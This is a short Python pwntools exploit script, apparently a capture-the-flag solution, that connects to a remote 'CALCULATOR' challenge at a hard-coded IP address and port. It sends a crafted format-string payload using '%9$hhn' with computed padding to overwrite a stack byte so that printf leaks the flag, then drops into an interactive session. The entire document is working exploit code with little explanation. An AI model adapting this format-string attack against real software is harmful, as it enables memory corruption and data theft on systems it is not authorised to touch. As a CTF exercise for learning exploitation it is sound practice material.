#!/usr/bin/python2.7

from pwn import *
import sys

def main():

    p = remote("199.247.6.180", 10008)

    # Wait for debugger (gdb)
    #p = process("./chall")
    #pid = util.proc.pidof(p)[0]
    #print("The pid is: " + str(pid))
    #util.proc.wait_for_debugger(pid)

    msg = p.recvuntil("CALCULATOR")
    print(msg)

    get_addr_of_buf_null_on_stack = "@+31";

    # we need up to 9 written bytes, so that printf will write a \x09 (horizontal tab)
    # instead of \x00, making printf leak the flag
    padding_1 = " " * (9 - len(get_addr_of_buf_null_on_stack))

    write_to_addr_of_buf_null = "%9$hhn"

    padding_2 = " " * (31 - len(get_addr_of_buf_null_on_stack + padding_1 + write_to_addr_of_buf_null))

    payload = get_addr_of_buf_null_on_stack + padding_1 + write_to_addr_of_buf_null + padding_2
    p.send(payload)

    msg = p.recv()
    print(msg)

    # Trigger the flag leak
    p.send("A" * 31)

    p.interactive()

    p.close()

if __name__ == "__main__":
    main()
